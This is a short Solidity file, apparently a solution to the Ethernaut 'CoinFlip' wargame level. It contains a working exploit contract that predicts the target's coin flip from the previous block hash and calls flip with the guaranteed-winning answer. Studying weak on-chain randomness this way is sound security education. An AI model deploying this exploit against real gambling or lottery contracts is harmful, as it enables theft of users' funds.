pragma solidity ^0.4.18;

contract CoinFlip {
  function CoinFlip() public {}
  function flip(bool _guess) public returns (bool) {}
}

contract CoinFlipCheater{
    address instance_address = /*ur_instance_address_here*/;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hack() public{
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = (coinFlip==1);
        CoinFlip target = CoinFlip(instance_address);
        target.flip(side);
    }
}